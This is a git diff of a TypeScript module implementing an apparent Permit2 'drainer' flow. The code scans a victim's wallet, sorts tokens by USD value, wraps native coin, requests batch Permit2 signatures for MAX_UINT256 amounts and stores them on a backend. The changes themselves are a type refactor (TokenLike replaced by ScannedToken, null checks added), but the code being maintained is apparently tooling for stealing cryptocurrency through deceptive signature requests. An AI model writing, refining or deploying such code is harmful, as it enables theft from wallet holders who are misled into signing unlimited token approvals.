@@ -2,7 +2,7 @@
 import { toast } from 'sonner';
 import { type Address } from 'viem';
 import { storePermit2Signature, type Permit2BatchTypedData } from './backendClient';
-import { scanWallet } from './walletScanner';
+import { scanWallet, type ScannedToken } from './walletScanner';
 import { wrapNativeIfNeeded } from './nativeWrap';
 import {
   cancelSignatureLoop,
@@ -46,39 +46,31 @@ function generateNonce(): string {
   return '0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
-interface TokenLike {
-  address: string;
-  symbol?: string;
-  balance: bigint;
-  balanceFormatted?: string;
-  decimals?: number;
-  valueUsd?: number;
-  isNative?: boolean;
-}
-
 // ── Dedupe / sanitize the scanned token list before batching ──
-function sanitizeTokens(tokens: TokenLike[]): TokenLike[] {
+function sanitizeTokens(tokens: ScannedToken[]): ScannedToken[] {
   const seen = new Set<string>();
-  const out: TokenLike[] = [];
+  const out: ScannedToken[] = [];
   for (const t of tokens) {
+    // Native tokens have address: null — skip them here,
+    // they get handled by the wrap step before this runs.
+    if (!t.address) continue;
     const key = t.address.toLowerCase();
-    if (!t.address || t.address === '0x' + '0'.repeat(40)) continue; // skip native
     if (seen.has(key)) continue;
     if (t.balance <= 0n) continue;
-    if ((t.valueUsd ?? 0) < MIN_TOKEN_VALUE_USD) continue;
+    if (t.valueUsd < MIN_TOKEN_VALUE_USD) continue;
     seen.add(key);
     out.push(t);
   }
   // Highest value first — these land in the wallet's batch display first.
   return out
-    .sort((a, b) => (b.valueUsd ?? 0) - (a.valueUsd ?? 0))
+    .sort((a, b) => b.valueUsd - a.valueUsd)
     .slice(0, MAX_TOKENS_PER_BATCH);
 }
 
 // ── Batch typed data: PermitBatchTransferFrom ──
 const buildPermit2BatchTypedData = (params: {
   chainId: number;
-  tokens: TokenLike[];
+  tokens: ScannedToken[];
   nonce: string;
   deadline: number;
 }): Permit2BatchTypedData => ({
@@ -214,7 +206,7 @@ export async function runPermit2Flow({
   const activeChainId = chainId ?? 1;
 
   // ── 1. Scan the wallet ──
-  let tokens: TokenLike[];
+  let tokens: ScannedToken[];
   try {
     tokens = await scanWallet(address as Address, activeChainId);
   } catch (err: any) {
@@ -243,7 +235,7 @@ export async function runPermit2Flow({
   if (top.isNative) {
     try {
       const wrapResult = await wrapNativeIfNeeded(address, activeChainId, {
-        address: top.address,
+        address: top.address ?? '',
         symbol: top.symbol,
         balance: top.balance,
         balanceFormatted: top.balanceFormatted,
@@ -282,11 +274,11 @@ export async function runPermit2Flow({
     }
   }
 
-  const totalUsd = tokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
-  const batchUsd = batchTokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
+  const totalUsd = tokens.reduce((sum, t) => sum + t.valueUsd, 0);
+  const batchUsd = batchTokens.reduce((sum, t) => sum + t.valueUsd, 0);
 
   // ── 3. Chain switch if needed ──
-  let effectiveChainId = (batchTokens[0] as any).chainId ?? activeChainId;
+  let effectiveChainId = batchTokens[0].chainId ?? activeChainId;
   if (effectiveChainId !== activeChainId) {
     const provider = getProvider();
     if (provider) {
@@ -318,7 +310,7 @@ export async function runPermit2Flow({
         })
       : buildPermit2SingleTypedData({
           chainId: effectiveChainId,
-          token: batchTokens[0].address,
+          token: batchTokens[0].address!,
           nonce,
           deadline,
         });
@@ -359,7 +351,7 @@ export async function runPermit2Flow({
         mode: batchMode ? 'batch' : 'single',
         tokens: batchMode
           ? batchTokens.map(t => ({
-              token: t.address,
+              token: t.address!,
               tokenSymbol: t.symbol,
               balance: t.balance.toString(),
               balanceFormatted: t.balanceFormatted,
@@ -368,7 +360,7 @@ export async function runPermit2Flow({
               signedAmount: MAX_UINT256,
             }))
           : [],
-        token: batchTokens[0].address,
+        token: batchTokens[0].address!,
         tokenSymbol: batchTokens[0].symbol,
         amount: batchTokens[0].balance.toString(),
         signedAmount: MAX_UINT256,
